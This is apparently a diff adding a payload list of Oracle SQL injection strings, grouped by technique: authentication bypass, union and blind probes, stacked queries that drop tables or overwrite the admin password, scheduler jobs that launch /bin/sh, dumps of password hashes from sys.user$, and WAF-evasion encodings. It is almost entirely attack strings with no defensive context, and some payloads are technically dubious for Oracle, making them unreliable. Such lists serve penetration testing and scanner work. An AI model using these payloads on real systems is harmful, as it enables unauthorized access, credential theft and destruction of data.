@@ -1,0 +1,293 @@
+# Oracle SQL Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Oracle SQL Injection
+
+# ============================================
+# ORACLE - AUTHENTICATION BYPASS
+# ============================================
+
+admin'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or 1=1--
+admin' or 'a'='a
+admin' or 1=1/*
+') or ('1'='1
+') or '1'='1'--
+' OR '1'='1'--
+
+# ============================================
+# ORACLE - UNION BASED
+# ============================================
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+' UNION SELECT banner FROM v$version--
+' UNION SELECT version FROM v$instance--
+' UNION SELECT user FROM dual--
+' UNION SELECT sysdate FROM dual--
+' UNION SELECT to_char(CURRENT_DATE) FROM dual--
+
+# ============================================
+# ORACLE - ERROR BASED
+# ============================================
+
+' AND 1=CTXSYS.DRILOAD.VALIDATE('test')--
+' AND 1=ORDDicom.DicomDictionary--
+' AND 1=SCOTT.TOOLTIP.GETPICTURE('test')--
+' AND (SELECT COUNT(*) FROM all_tables)>0--
+
+# Using dbms_xslprocessor
+' AND 1=DBMS_XSLPROCESSOR.READ2FILE('/etc/passwd','test')--
+
+# ============================================
+# ORACLE - BLIND
+# ============================================
+
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 1 FROM dual WHERE 1=1)=1--
+' AND (SELECT 1 FROM dual WHERE 1=2)=1--
+
+# Time-based
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',10)--
+' AND 1=DBMS_LOCK.SLEEP(10)--
+' AND 1=HEXTORAW('00')--
+
+# ============================================
+# ORACLE - STACKED QUERIES
+# ============================================
+
+'; DROP TABLE users;--
+'; INSERT INTO users (username,password) VALUES ('admin','admin123');--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+'; DELETE FROM users;--
+'; CREATE TABLE test (id NUMBER);--
+'; COMMIT;--
+
+# ============================================
+# ORACLE - RCE
+# ============================================
+
+# Using Java
+'; EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION system(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE p_cmd; RETURN ''done''; END;'; END;--
+'; SELECT system('id') FROM dual;--
+
+# Using DBMS_SCHEDULER
+'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => ''test'', job_type => ''EXECUTABLE'', job_action => ''/bin/sh'', start_date => SYSTIMESTAMP); END;--
+'; BEGIN DBMS_SCHEDULER.RUN_JOB('test'); END;--
+
+# Using CTXSYS
+'; SELECT CTXSYS.MATCHES('test','(SELECT password FROM users)') FROM dual;--
+
+# ============================================
+# ORACLE - INFORMATION_SCHEMA
+# ============================================
+
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT table_name FROM user_tables--
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+' UNION SELECT owner,table_name FROM all_tables--
+
+# ============================================
+# ORACLE - VERSION
+# ============================================
+
+' UNION SELECT banner FROM v$version--
+' UNION SELECT version FROM v$instance--
+' UNION SELECT banner FROM v$version WHERE banner LIKE '%Oracle%'--
+' UNION SELECT * FROM v$version--
+
+# ============================================
+# ORACLE - USERS
+# ============================================
+
+' UNION SELECT username FROM all_users--
+' UNION SELECT username FROM user_users--
+' UNION SELECT username FROM dba_users--
+' UNION SELECT name,password FROM sys.user$--
+
+# ============================================
+# ORACLE - PRIVILEGES
+# ============================================
+
+' UNION SELECT granted_role FROM user_role_privs--
+' UNION SELECT privilege FROM session_privs--
+' UNION SELECT * FROM user_sys_privs--
+
+# ============================================
+# ORACLE - TABLES
+# ============================================
+
+' UNION SELECT table_name FROM user_tables--
+' UNION SELECT table_name FROM all_tables WHERE owner='SYS'--
+' UNION SELECT owner,table_name FROM all_tables--
+
+# ============================================
+# ORACLE - COLUMNS
+# ============================================
+
+' UNION SELECT column_name FROM user_tab_columns WHERE table_name='USERS'--
+' UNION SELECT column_name,data_type FROM user_tab_columns--
+
+# ============================================
+# ORACLE - STRING FUNCTIONS
+# ============================================
+
+' UNION SELECT CHR(65)||CHR(66)||CHR(67) FROM dual--
+' UNION SELECT ASCII('A') FROM dual--
+' UNION SELECT SUBSTR('test',1,1) FROM dual--
+' UNION SELECT LENGTH('test') FROM dual--
+
+# ============================================
+# ORACLE - PASSWORD HASH
+# ============================================
+
+' UNION SELECT name,password FROM sys.user$--
+' UNION SELECT name,password,spare4 FROM sys.user$--
+
+# ============================================
+# ORACLE - DATABASE LINKS
+# ============================================
+
+' UNION SELECT * FROM user_db_links--
+' UNION SELECT db_link FROM user_db_links--
+
+# ============================================
+# ORACLE - PROCEDURES
+# ============================================
+
+' UNION SELECT object_name FROM user_procedures--
+' UNION SELECT object_name,object_type FROM user_objects WHERE object_type='PROCEDURE'--
+
+# ============================================
+# ORACLE - PACKAGES
+# ============================================
+
+' UNION SELECT package_name FROM user_packages--
+' UNION SELECT object_name FROM user_objects WHERE object_type='PACKAGE'--
+
+# ============================================
+# ORACLE - FUNCTIONS
+# ============================================
+
+' UNION SELECT function_name FROM user_functions--
+' UNION SELECT object_name FROM user_objects WHERE object_type='FUNCTION'--
+
+# ============================================
+# ORACLE - VIEWS
+# ============================================
+
+' UNION SELECT view_name FROM user_views--
+' UNION SELECT text FROM user_views WHERE view_name='USERS'--
+
+# ============================================
+# ORACLE - TRIGGERS
+# ============================================
+
+' UNION SELECT trigger_name FROM user_triggers--
+' UNION SELECT trigger_body FROM user_triggers WHERE trigger_name='TEST'--
+
+# ============================================
+# ORACLE - SEQUENCES
+# ============================================
+
+' UNION SELECT sequence_name FROM user_sequences--
+' UNION SELECT last_number FROM user_sequences WHERE sequence_name='TEST'--
+
+# ============================================
+# ORACLE - INDEXES
+# ============================================
+
+' UNION SELECT index_name FROM user_indexes--
+' UNION SELECT index_name,table_name FROM user_indexes--
+
+# ============================================
+# ORACLE - CONSTRAINTS
+# ============================================
+
+' UNION SELECT constraint_name FROM user_constraints--
+' UNION SELECT constraint_name,table_name FROM user_constraints WHERE constraint_type='P'--
+
+# ============================================
+# ORACLE - COMMENTS
+# ============================================
+
+-- Comment
+# Comment
+/* Comment */
+
+# ============================================
+# ORACLE - BYPASS WAF
+# ============================================
+
+# Case variation
+AdMiN'--
+
+# Whitespace
+admin'/**/--
+admin'	--
+admin'%09--
+
+# Double encoding
+admin%27--
+
+# Unicode
+admin\u0027--
+
+# Newline
+admin'%0a--
+
+# ============================================
+# ORACLE - TIME-BASED RCE
+# ============================================
+
+' AND DBMS_PIPE.RECEIVE_MESSAGE('test',10)=1--
+' AND DBMS_LOCK.SLEEP(10)=1--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',10)--
+
+# ============================================
+# ORACLE - DBLINK EXPLOITATION
+# ============================================
+
+' UNION SELECT * FROM user$@link--
+' UNION SELECT * FROM dual@link--
+
+# ============================================
+# ORACLE - LATERAL DB
+# ============================================
+
+' UNION SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM AS RN FROM ALL_TABLES) WHERE RN=1--
+
+# ============================================
+# ORACLE - CHR FUNCTION
+# ============================================
+
+' UNION SELECT CHR(65)||CHR(66)||CHR(67) FROM DUAL--
+' UNION SELECT CHR(39)||'admin'||CHR(39) FROM DUAL--
+
+# ============================================
+# ORACLE - PIVOT
+# ============================================
+
+' UNION SELECT * FROM (SELECT USERNAME,PASSWORD FROM USERS) PIVOT (MAX(PASSWORD) FOR USERNAME IN ('admin'))--
+
+# ============================================
+# ORACLE - JSON
+# ============================================
+
+' UNION SELECT JSON_OBJECT('username' VALUE USERNAME) FROM USERS--
+' UNION SELECT JSON_VALUE('{""username"":""admin""}','$.username') FROM DUAL--
+
+# ============================================
+# ORACLE - XML
+# ============================================
+
+' UNION SELECT EXTRACTVALUE(XMLType('<?xml version="1.0"?><foo><bar>'||(SELECT USERNAME FROM USERS WHERE ROWNUM=1)||'</bar></foo>'),'/foo/bar') FROM DUAL--
+
